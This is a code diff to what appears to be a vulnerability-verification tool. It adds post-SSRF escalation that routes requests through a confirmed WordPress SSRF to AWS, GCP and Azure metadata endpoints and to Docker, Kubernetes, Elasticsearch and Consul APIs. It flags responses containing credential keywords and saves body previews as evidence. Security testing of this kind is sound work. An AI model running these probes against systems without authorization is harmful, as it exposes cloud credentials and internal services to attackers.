@@ -9421,6 +9421,53 @@ def verify_wordpress_ssrf(
                 caption_en=(f"Step 5 (KEY): SSRF CONFIRMED — internal listener log shows "
                             f"token received from server-side request: {url_param}={_callback_url!r}"),
                 url=boot.base_url + endpoint)
+            # --- Post-SSRF escalation: probe internal/cloud services ---
+            try:
+                _ssrf_probe_targets = [
+                    # Cloud metadata
+                    ("AWS_IMDS", "http://169.254.169.254/latest/meta-data/"),
+                    ("GCP_IMDS", "http://metadata.google.internal/computeMetadata/v1/instance/"),
+                    ("Azure_IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+                    # Docker daemon HTTP API (host-exposed, common misconfiguration)
+                    ("Docker_API", "http://172.17.0.1:2375/version"),
+                    ("Docker_API_local", "http://127.0.0.1:2375/version"),
+                    # Kubernetes API (if in K8s cluster)
+                    ("K8s_API", "http://kubernetes.default.svc/api/v1/namespaces"),
+                    # Elasticsearch (commonly unauthenticated)
+                    ("Elasticsearch", "http://127.0.0.1:9200/"),
+                    # Consul
+                    ("Consul", "http://127.0.0.1:8500/v1/agent/self"),
+                ]
+                _ssrf_post_hits = []
+                for _svc_name, _svc_url in _ssrf_probe_targets:
+                    try:
+                        _sp = dict(base_params); _sp[url_param] = _svc_url
+                        _sr = boot.sub_sess.request(
+                            m, boot.base_url + endpoint,
+                            data=_sp if m != "GET" else None,
+                            params=_sp if m == "GET" else None,
+                            timeout=6)
+                        _sbody = getattr(_sr, "text", "") or ""
+                        # Classify response: metadata keywords, Docker/K8s JSON, Consul/ES data
+                        _meta_kws = ("ami-id", "instance-id", "meta-data", "computeMetadata",
+                                     "subscriptionId", "accesskeyid", "secretaccesskey",
+                                     "\"Version\":", "\"ApiVersion\":", "\"KubeletVersion\":",
+                                     "\"leader\":", "\"index\":", "\"cluster_name\":")
+                        if any(kw in _sbody for kw in _meta_kws):
+                            _ssrf_post_hits.append({
+                                "service": _svc_name,
+                                "url": _svc_url,
+                                "body_preview": _sbody[:300],
+                            })
+                            step(f"SSRF post-exploit: {_svc_name} respondio — {_sbody[:80]!r}")
+                    except Exception:
+                        pass
+                if _ssrf_post_hits:
+                    res.evidence["ssrf_internal_services"] = _ssrf_post_hits
+                    _svc_names = ", ".join(h["service"] for h in _ssrf_post_hits)
+                    res.detail += (f"\n\nESCALACIÓN SSRF: servicios internos alcanzables: {_svc_names}")
+            except Exception:
+                pass
         else:
             res.ok = True
             res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion (hostname, IP "
